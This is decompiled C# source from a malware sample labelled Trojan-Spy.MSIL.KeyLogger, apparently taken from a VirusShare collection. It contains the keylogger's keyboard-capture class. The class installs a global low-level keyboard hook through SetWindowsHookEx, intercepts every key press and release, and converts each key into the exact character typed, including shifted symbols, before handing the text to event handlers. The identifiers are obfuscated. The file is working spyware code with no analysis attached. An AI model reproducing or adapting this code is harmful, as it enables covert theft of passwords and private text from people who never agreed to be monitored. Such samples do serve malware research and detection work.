// Decompiled with JetBrains decompiler
// Type: DKZdzRzsT
// Assembly: java, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4F52145B-C1A7-459C-A2DE-CBB30B6015C6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.cve-9472961f0eb1b1eabf0fa24a446a9649c2ef21221933f756389470464205e723.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class DKZdzRzsT
{
  private static int INjfAiTYULSy;
  private static DKZdzRzsT.QphyBhUjS NBAWOnoIUSzr;

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int IotIDIvaQ(
    int BJxmEPeOZ,
    DKZdzRzsT.QphyBhUjS luvJzvJbK,
    int kGpjtQnYe,
    int kikJUBDRYaXk);

  [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int YYJKLJgRQRhv(
    int BJxmEPeOZ,
    int lBWTnexoOosx,
    int yULbvlLsrZrn,
    ref DKZdzRzsT.EEUyKgrhVkOz HJFsnADcnlfF);

  [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int zkssvUfPYYyr(int BJxmEPeOZ);

  public static event DKZdzRzsT.ofcThDZWxwfpEventHandler ofcThDZWxwfp;

  public static event DKZdzRzsT.cFgPcDbDdHZdEventHandler cFgPcDbDdHZd;

  public void gpQlWcgtIzEA()
  {
    DKZdzRzsT.NBAWOnoIUSzr = new DKZdzRzsT.QphyBhUjS(this.vYxruooJgorL);
    DKZdzRzsT.INjfAiTYULSy = DKZdzRzsT.IotIDIvaQ(13, DKZdzRzsT.NBAWOnoIUSzr, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
  }

  private int vYxruooJgorL(
    int QrxnjBwOUEeK,
    int yULbvlLsrZrn,
    ref DKZdzRzsT.EEUyKgrhVkOz HJFsnADcnlfF)
  {
    if (QrxnjBwOUEeK == 0)
    {
      switch (yULbvlLsrZrn)
      {
        case 256:
        case 260:
          DKZdzRzsT.ofcThDZWxwfpEventHandler ofcThDzWxwfpEvent = DKZdzRzsT.ofcThDZWxwfpEvent;
          if (ofcThDzWxwfpEvent != null)
          {
            ofcThDzWxwfpEvent(this.SWGNWtUkhPcx((Keys) HJFsnADcnlfF.QrxnjBwOUEeK));
            break;
          }
          break;
        case 257:
        case 261:
          DKZdzRzsT.cFgPcDbDdHZdEventHandler fgPcDbDdHzdEvent = DKZdzRzsT.cFgPcDbDdHZdEvent;
          if (fgPcDbDdHzdEvent != null)
          {
            fgPcDbDdHzdEvent(this.SWGNWtUkhPcx((Keys) HJFsnADcnlfF.QrxnjBwOUEeK));
            break;
          }
          break;
      }
    }
    return DKZdzRzsT.YYJKLJgRQRhv(DKZdzRzsT.INjfAiTYULSy, QrxnjBwOUEeK, yULbvlLsrZrn, ref HJFsnADcnlfF);
  }

  public void sAocURHikwJC()
  {
    DKZdzRzsT.zkssvUfPYYyr(DKZdzRzsT.INjfAiTYULSy);
    // ISSUE: explicit finalizer call
    this.Finalize();
  }

  private string SWGNWtUkhPcx(Keys jdVavzkBTWiZ)
  {
    Keys keys = jdVavzkBTWiZ;
    if (keys >= Keys.A && keys <= Keys.Z)
      return Control.IsKeyLocked(Keys.Capital) | (Control.ModifierKeys & Keys.Shift) != Keys.None ? jdVavzkBTWiZ.ToString() : jdVavzkBTWiZ.ToString().ToLower();
    if (keys >= Keys.D0 && keys <= Keys.D9)
    {
      if ((Control.ModifierKeys & Keys.Shift) == Keys.None)
        return jdVavzkBTWiZ.ToString().Replace("D", (string) null);
      string Left = jdVavzkBTWiZ.ToString();
      if (Operators.CompareString(Left, "D1", false) == 0)
        return "!";
      if (Operators.CompareString(Left, "D2", false) == 0)
        return "@";
      if (Operators.CompareString(Left, "D3", false) == 0)
        return "#";
      if (Operators.CompareString(Left, "D4", false) == 0)
        return "$";
      if (Operators.CompareString(Left, "D5", false) == 0)
        return "%";
      if (Operators.CompareString(Left, "D6", false) == 0)
        return "^";
      if (Operators.CompareString(Left, "D7", false) == 0)
        return "&";
      if (Operators.CompareString(Left, "D8", false) == 0)
        return "*";
      if (Operators.CompareString(Left, "D9", false) == 0)
        return "(";
      if (Operators.CompareString(Left, "D0", false) == 0)
        return ")";
    }
    else
    {
      if (keys >= Keys.NumPad0 && keys <= Keys.NumPad9)
        return jdVavzkBTWiZ.ToString().Replace("NumPad", (string) null);
      if (keys >= Keys.Multiply && keys <= Keys.Divide)
      {
        string Left = jdVavzkBTWiZ.ToString();
        if (Operators.CompareString(Left, "Divide", false) == 0)
          return "/";
        if (Operators.CompareString(Left, "Multiply", false) == 0)
          return "*";
        if (Operators.CompareString(Left, "Subtract", false) == 0)
          return "-";
        if (Operators.CompareString(Left, "Add", false) == 0)
          return "+";
        if (Operators.CompareString(Left, "Decimal", false) == 0)
          return ".";
      }
      else
      {
        if (keys == Keys.Space)
          return " ";
        if (keys >= Keys.OemSemicolon && keys <= Keys.OemQuotes)
        {
          if ((Control.ModifierKeys & Keys.Shift) != Keys.None)
          {
            string Left = jdVavzkBTWiZ.ToString();
            if (Operators.CompareString(Left, "OemMinus", false) == 0)
              return "_";
            if (Operators.CompareString(Left, "Oemplus", false) == 0)
              return "+";
            if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
              return "{";
            if (Operators.CompareString(Left, "Oem6", false) == 0)
              return "}";
            if (Operators.CompareString(Left, "Oem5", false) == 0)
              return "|";
            if (Operators.CompareString(Left, "Oem1", false) == 0)
              return ":";
            if (Operators.CompareString(Left, "Oem7", false) == 0)
              return "\"";
            if (Operators.CompareString(Left, "Oemcomma", false) == 0)
              return "<";
            if (Operators.CompareString(Left, "OemPeriod", false) == 0)
              return ">";
            if (Operators.CompareString(Left, "OemQuestion", false) == 0)
              return "?";
            if (Operators.CompareString(Left, "Oemtilde", false) == 0)
              return "~";
          }
          else
          {
            string Left = jdVavzkBTWiZ.ToString();
            if (Operators.CompareString(Left, "OemMinus", false) == 0)
              return "-";
            if (Operators.CompareString(Left, "Oemplus", false) == 0)
              return "=";
            if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
              return "[";
            if (Operators.CompareString(Left, "Oem6", false) == 0)
              return "]";
            if (Operators.CompareString(Left, "Oem5", false) == 0)
              return "\\";
            if (Operators.CompareString(Left, "Oem1", false) == 0)
              return ";";
            if (Operators.CompareString(Left, "Oem7", false) == 0)
              return "'";
            if (Operators.CompareString(Left, "Oemcomma", false) == 0)
              return ",";
            if (Operators.CompareString(Left, "OemPeriod", false) == 0)
              return ".";
            if (Operators.CompareString(Left, "OemQuestion", false) == 0)
              return "/";
            if (Operators.CompareString(Left, "Oemtilde", false) == 0)
              return "`";
          }
        }
        else
          return keys == Keys.Return ? Environment.NewLine : "<" + jdVavzkBTWiZ.ToString() + ">";
      }
    }
    return (string) null;
  }

  private delegate int QphyBhUjS(
    int lBWTnexoOosx,
    int yULbvlLsrZrn,
    ref DKZdzRzsT.EEUyKgrhVkOz HJFsnADcnlfF);

  public delegate void ofcThDZWxwfpEventHandler(string INjfAiTYULSy);

  public delegate void cFgPcDbDdHZdEventHandler(string INjfAiTYULSy);

  private struct EEUyKgrhVkOz
  {
    public int QrxnjBwOUEeK;
    public int kNhzkzfYLgTT;
    public int NCfFJcIQQiBa;
    public int YPuOHJbyQTtv;
    public int iokNYhvntnbV;
  }
}
